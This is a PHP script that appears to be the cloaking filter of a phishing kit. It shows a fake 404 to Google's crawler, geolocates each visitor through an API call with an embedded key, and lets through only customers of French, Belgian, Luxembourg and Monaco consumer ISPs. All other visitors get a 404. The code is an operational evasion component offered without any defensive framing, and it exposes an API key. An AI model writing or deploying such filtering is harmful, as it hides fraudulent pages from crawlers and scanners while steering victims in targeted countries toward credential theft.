<?php


if (strpos($_SERVER['HTTP_USER_AGENT'], 'google') !== false) {
  header('HTTP/1.0 404 Not Found');
  die('HTTP/1.0 404 Not Found');
  exit();
}



function getUserIP()
{
  if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
  }
  $client  = @$_SERVER['HTTP_CLIENT_IP'];
  $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
  $remote  = $_SERVER['REMOTE_ADDR'];

  if (filter_var($client, FILTER_VALIDATE_IP)) {
    $ip = $client;
  } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
    $ip = $forward;
  } else {
    $ip = $remote;
  }

  return $ip;
}
$ip = getUserIP();


function getIpInfo($ip = '')
{
  $ipinfo = file_get_contents("https://api.ipgeolocation.io/ipgeo?apiKey=b9550edc63f64a59b2b146b7a3f6f9a1&ip=" . $ip . "");
  $ipinfo_json = json_decode($ipinfo, true);
  return $ipinfo_json;
}


$visitor_ip = $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIpInfo($visitor_ip);

$org = "{$ipinfo_json['organization']}";
$ze = "{$ipinfo_json['city']}";
$ca = "{$ipinfo_json['country_name']}";





if (preg_match("/SFR/i", $org) || strpos($org, "Bouygues") || strpos($org, "Orange") || strpos($org, "Sfr") || strpos($org, "Proximus") || strpos($org, "SFR") || strpos($org, "Free") || strpos($org, "Wanadoo") || preg_match("/Free/i", $org) || preg_match("/Orange/i", $org) || preg_match("/Bouygues/i", $org) || preg_match("/Laposte/i", $org) || preg_match("/Wanadoo/i", $org) || preg_match("/Free SAS/i", $org) || preg_match("/Coriolis/i", $org) || preg_match("/Monaco Telecom/i", $org) || preg_match("/POST Luxembourg/i", $org)) {
} else {
  die(header('HTTP/1.0 404 Not Found'));
}
